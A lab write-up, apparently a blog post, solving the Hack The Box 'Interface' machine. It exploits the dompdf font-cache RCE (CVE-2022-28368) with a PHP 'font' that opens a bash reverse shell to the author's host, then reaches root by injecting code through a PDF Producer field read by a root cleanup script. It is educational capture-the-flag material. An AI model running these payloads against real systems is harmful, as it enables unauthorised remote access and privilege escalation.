---
title: "Hack The Box - Interface [Medium]"
date: 2023-06-08T02:01:27+03:00
draft: false
tags: ["hackthebox"]
---

The most important in this machine would be the enumeration, it exploits vulnerabilities like:
- [CVE-2022-28368](https://snyk.io/blog/security-alert-php-pdf-library-dompdf-rce/)
- [Executing files with sudo privileges](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid)

## Recon 

I started with just the website `interface.htb` where there isn't much going on, from what I gathered I saw that it was a Next.js application, but the interesting thing there were the headers.

```http
HTTP/1.1 200 OK
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 14 Feb 2023 08:44:41 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Security-Policy: script-src 'unsafe-inline' 'unsafe-eval' 'self' data: https://www.google.com http://www.google-analytics.com/gtm/js https://*.gstatic.com/feedback/ https://ajax.googleapis.com; connect-src 'self' http://prd.m.rendering-api.interface.htb; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://www.google.com; img-src https: data:; child-src data:;
X-Powered-By: Next.js
ETag: "i8ubiadkff4wf"
Vary: Accept-Encoding
Content-Length: 6359
```

I saw the CSP header which has a bunch of websites in, and frankly I didn't spot the subdomain at first, but that was the next pivoting point `http://prd.m.rendering-api.interface.htb`.

Going to the subdomain, you are greeted by a single `File not Found` text with a 404 status. Here comes the tricky part, the usual reconning using `ffuf,feroxbuster` and such, are ignoring the 404 status over the things it finds, and it's tricky to set something that is working for this particular case.

```
$ ffuf -w ~/Tools/SecLists/Discovery/Web-Content/common.txt -u http://prd.m.rendering-api.interface.htb/FUZZ -mc all -fs 0
```

I found several endpoints that are returning more than just 404.

```
api/experiments/configurations [Status: 404, Size: 50, Words: 3, Lines: 1...
api/experiments         [Status: 404, Size: 50, Words: 3, Lines: 1, Duration: 
api                     [Status: 404, Size: 50, Words: 3, Lines: 1, Duration: 
vendor                  [Status: 403, Size: 15, Words: 2, Lines: 2, Duration: 
```

Using `curl`, I found some API responses over those endpoints.

```http
$ curl -i http://prd.m.rendering-api.interface.htb/api/                                  
HTTP/1.1 404 Not Found
Server: nginx/1.14.0 (Ubuntu)
Date: Tue, 14 Feb 2023 08:53:49 GMT
Content-Type: application/json
Transfer-Encoding: chunked
Connection: keep-alive

{"status":"404","status_text":"route not defined"}
```

Then I began enumerating the API, by filtering the 404 using a GET request. 

The tricky thing is that you must try to use all the methods `GET,POST,PUT,DELETE` on everything. That could have been easier with `feroxbuster` but the thing is that on the `feroxbuster` tool there isn't an `-mc all` option which matches all the response codes and I had to do it manually with `ffuf`.

This is what I've used to find another pivot point.

```
$ ffuf -w ~/Tools/SecLists/Discovery/Web-Content/big.txt -u http://prd.m.rendering-api.interface.htb/api/FUZZ -mc all -fs 50 -X POST
...
html2pdf                [Status: 422, Size: 36, Words: 2, Lines: 1...
```

I found other stuff like `composer,dumpdf` before that and I started to search some exploits for `dumpdf` since I thought that would be the next pivot point and found this PoC of an exploit: https://github.com/positive-security/dompdf-rce.

The next thing to figure out was how to pass the file to that endpoint. While I tried to just send the file without any parameters, it returns `missing parameters` so I had to explore the `dompdf` implementations. The parameters that `dompdf` uses are just two. 

```php
$dompdf->loadHtml($html); 
$dompdf->setPaper('A4', 'landscape');
$dompdf->render();
```

I know that this is an API, so it must accept some JSON, so I crafted some random payload which I admit I got really lucky.

```json
{
	"html": "<h1>test</h1>",
	"paper": "A4"
}
```

Because the response was `200 OK` and a binary with the attached PDF.

## Exploiting the `dumpdf RCE`

The `dumpdf` is apparently caching the fonts that it processes during the conversion of HTML to PDF. It stores them under `/vendor/dompdf/dompdf/lib/fonts/` folder. Earlier in my discovery I enumerated another possible pivoting point that however gave 403, which was `/vendor/dompdf/dompdf` so following the PoC I've crafted the following payload.

```http
POST /api/html2pdf HTTP/1.1
Host: prd.m.rendering-api.interface.htb
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/json
Connection: close
Content-Length: 47

{
	"html": "<link rel=stylesheet href='http://10.10.14.73:8000/syl.css'>",
	"paper": "A4"
}
```

```
# syl.css
@font-face {
    font-family:'syl';
    src:url('http://10.10.14.73:8000/syl.php');
    font-weight:'normal';
    font-style:'normal';
}
```

```
# syl.php, this is a legit font just with 1 line PHP on the bottom
<LEGIT FONT BINARY DATA>
<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.73/4444 0>&1'"); ?>
```

After that I execute the request, the server would try to get the CSS and the font from my server, and it would cache the font into the specified folder and after executing the request. I saw that it does exactly that:

```
# My Server logs
10.129.20.249 - - [14/Feb/2023 11:20:07] "GET /syl.css HTTP/1.0" 200 -
10.129.20.249 - - [14/Feb/2023 11:20:07] "GET /syl.php HTTP/1.0" 200 -
```

That means that we have our 'font' already cached on the server under the folder `/vendor/dompdf/dompdf/lib/fonts/` however what would be the name, because trying to execute `syl.php` wasn't yielding results. 

To figure that out I thought it might be several things, `md5(file), md5(url of the font), some_hashing_algo(file/url of the font)` so I had to research how it saves the fonts. Fortunately, the PoC gives us a clue of how is this working. The font file there is named `exploitfont_normal_3f83639933428d70e74a061f39009622.php` and I brute forced my way out of this by trying `syl_normal_` and `md5(file), md5(url of the font)` and the URL of the font was the right one, so I got a reverse shell with that. 

```
$ curl -i http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/syl_normal_ee17d95350fea4e27875b56170439107.php
...
$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.73] from (UNKNOWN) [10.129.20.249] 60822
pwd
/var/www/api/vendor/dompdf/dompdf/lib/fonts
```

With that and using `linpeas.sh` I could read the first flag which is located in `/home/dev/user.txt`.

## Gaining Root

This was a tricky one, and I got some help with it since I couldn't find how. I only found a script that was cleaning some cache files with the tag `Producer: dompdf` in the `/tmp` folder. The script is located here: `/usr/local/sbin/cleancache.sh`. I was pretty sure that this is the root pivot point, but I didn't know how to exploit it. 

I joined some discussions and one of the users mentioned the `# Bash’s white collar eval: [[ $var -eq 42 ]] runs arbitrary code too` - https://www.vidarholen.net/contents/blog/?p=716

I didn't know that you could do that, but after reading the article it was clear what I should do.

```
$ cd /tmp
$ mkdir syl
$ cd syl && wget http://10.10.14.73:8000/admin.sh
$ chmod +x ./admin.sh
$ wget http://10.10.14.73:8000/test.pdf
$ exiftool -Producer='a[$(/tmp/syl/admin.sh>&2)]+42' test.pdf
< -Producer='a[$(/tmp/syl/admin.sh>&2)]+42' test.pdf
    1 image files updated
$ /usr/local/sbin/cleancache.sh
/usr/local/sbin/cleancache.sh
chmod: changing permissions of '/bin/bash': Operation not permitted
chmod: changing permissions of '/bin/bash': Operation not permitted
$ /bin/bash -p
bash-4.4# cat /root/root.txt
```
